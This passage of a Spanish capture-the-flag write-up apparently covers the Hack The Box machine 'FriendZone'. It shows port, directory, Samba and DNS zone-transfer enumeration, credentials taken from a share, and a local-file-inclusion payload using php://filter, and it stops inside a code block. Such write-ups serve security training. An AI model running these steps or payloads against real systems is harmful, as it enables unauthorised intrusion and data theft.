&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-02-10 14:12 PST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.123
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;993&lt;/span&gt; closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http        Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
443/tcp open  ssl/http    Apache httpd 2.4.29
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Hosts: FRIENDZONE, 127.0.1.1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 46.20 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Haciendo un login como usuario anonimo no encontramos nada en este puerto.&lt;/p&gt;
&lt;h2 id=&#34;enum-http&#34;&gt;ENUM HTTP&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -u 10.10.10.123 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -x php,txt,html -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/wordpress &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ninguno de los directorios y archivos encontrados en el puerto 80 (HTTP) son de ayuda, pero en el index de la pagina aparece un dominio que podriamos utilizar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190210_202543.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;friendzoneportal.red&lt;/code&gt;. Agregamos el dominio al archivo host (&lt;code&gt;/etc/hosts&lt;/code&gt;) y encontramos que la pagina tiene contenido en el protocolo https, procedemos a enumerar los directorios y archivos.&lt;/p&gt;
&lt;h2 id=&#34;enum-https&#34;&gt;ENUM HTTPS&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gobuster -u https://friendzoneportal.red/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -np -k -x php,txt,html -t &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/https-2.webp&#34; alt=&#34;Image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;enum-samba&#34;&gt;ENUM Samba&lt;/h2&gt;
&lt;p&gt;Utilizando la herramienta smbclient para enumerar los sharenames que estan en el servicio de samba.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient -L 10.10.10.123
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FriendZone server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Reconnecting with SMB1 &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FROLIC
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En uno de los sharenames podemos ver que Files tiene un comentario que nos dice se encuentra en la carpeta local &lt;code&gt;/etc/files&lt;/code&gt;. al logearnos a &lt;code&gt;general&lt;/code&gt; encontramos unas credenciales y una frase &lt;code&gt;creds for the admin THING&lt;/code&gt; que podria hacer referencia a algun panel de administracion, en este sharename no tenemos permisos suficientes para subir o escribir archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.123&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;general
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Jan &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 12:10:51 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Jan &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 13:51:02 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  creds.txt                           N       &lt;span class=&#34;m&#34;&gt;57&lt;/span&gt;  Tue Oct  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 16:52:42 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;em&gt;creds.txt&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;creds for the admin THING:
admin:WORKWORKHhallelujah@#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando las credenciales que encontramos anteriormente, en &lt;code&gt;Development&lt;/code&gt; no encontramos nada pero si podemos escribir o subir archivos, mas no ejecutarlos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.123&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Development --user&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;admin WORKWORKHhallelujah@#

smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 19:12:08 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Jan &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 13:51:02 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  php-reverse-shell.php               N     &lt;span class=&#34;m&#34;&gt;5493&lt;/span&gt;  Sat Feb  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 18:47:48 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;enum-subdominios&#34;&gt;ENUM SubDOMINIOS&lt;/h2&gt;
&lt;p&gt;Utilizando la ip y el dominio anteriormente utilizado en https, encontramos varios subdominios:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dig axfr friendzoneportal.red @10.10.10.123

friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86400&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2419200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt;
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; IN	A	127.0.0.1
files.friendzoneportal.red. &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; IN	A	127.0.0.1
imports.friendzoneportal.red. &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; IN	A	127.0.0.1
vpn.friendzoneportal.red. &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86400&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2419200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ver Nmap scan &amp;ndash;&amp;gt; &lt;code&gt;friendzone.red&lt;/code&gt; (CommonName)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dig friendzone.red axfr @10.10.10.123

friendzone.red.		604800	IN	SOA	localhost. root.localhost. &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86400&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2419200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt;
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;86400&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2419200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;604800&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Agregamos los subdominios a &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;admin.friendzoneportal.red
files.friendzoneportal.red
imports.friendzoneportal.red
vpn.friendzoneportal.red

administrator1.friendzone.red
hr.friendzone.red
uploads.friendzone.red
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;enumerando-directorios-https---friendzonered&#34;&gt;ENUMERANDO DIRECTORIOS HTTPS -&amp;gt; friendzone.red&lt;/h3&gt;
&lt;h4 id=&#34;httpsfriendzonered&#34;&gt;&lt;a href=&#34;https://friendzone.red/&#34;&gt;https://friendzone.red/&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_002853.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;/js/js/&lt;/em&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_003018.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;httpsuploadsfriendzonered&#34;&gt;&lt;a href=&#34;https://uploads.friendzone.red&#34;&gt;https://uploads.friendzone.red&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_160704.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/files
/files/note
/upload.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;httpshrfriendzonered&#34;&gt;&lt;a href=&#34;https://hr.friendzone.red&#34;&gt;https://hr.friendzone.red&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;EMPTY&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;httpsadministrator1friendzonered&#34;&gt;&lt;a href=&#34;https://administrator1.friendzone.red&#34;&gt;https://administrator1.friendzone.red&lt;/a&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/dashboard.php
/login.php
/timestamp.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://www.securityartwork.es/2010/12/22/recopilacion-local-file-inclusion-lfi/&#34;&gt;&lt;em&gt;LFI - Securityartwork&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xapax.gitbooks.io/security/content/local_file_inclusion.html&#34;&gt;&lt;em&gt;LFI - xapax&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;httpsadministrator1friendzonered-1&#34;&gt;&lt;a href=&#34;https://administrator1.friendzone.red/&#34;&gt;https://administrator1.friendzone.red/&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;En el primer subdominio econtramos un login y utilizando las credenciales nos muestra un mensaje, donde nos indica que para mostrar la imagen del script debemos de insertar lo siguiente: &lt;code&gt;?image_id=a.jpg&amp;amp;pagename=timestamp&lt;/code&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190211_234815.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Al realizar dicho request a la pagina obtenemos la imagen y lo que parece el tiempo en que se ejecuto el programa.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_181158.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Si nos concentramos en la solicitud de la pagina podemos ver que existe un parametro que llama(include $_GET[&amp;lsquo;pagina&amp;rsquo;];) a una pagina &lt;code&gt;pagename=timestamp&lt;/code&gt;, anteriormente enumeramos los directorios y archivos de la pagina. Al intentar con el archivo login.php en lugar de timestamp nos muestra el siguiente mensaje.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/friendzone/Screenshot_20190212_181518.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos observar que la pagina es vulnerable a ataques de LFI, cuando se hace la solicitud del archivo (timestamp,login) este lo ejecuta y lo muestra por debajo como en la figura anterior. Para poder saltarnos la ejecutcion podemos utilizar un filtro de php en este caso &lt;code&gt;php://filter/convert.base64-encode/resource=archivophp&lt;/code&gt; y asi obtener el codigo fuente de los archivos locales en base64 para luego decodificarlo.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pagename=php://filter/convert.base64-encode/resource=dashboard&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
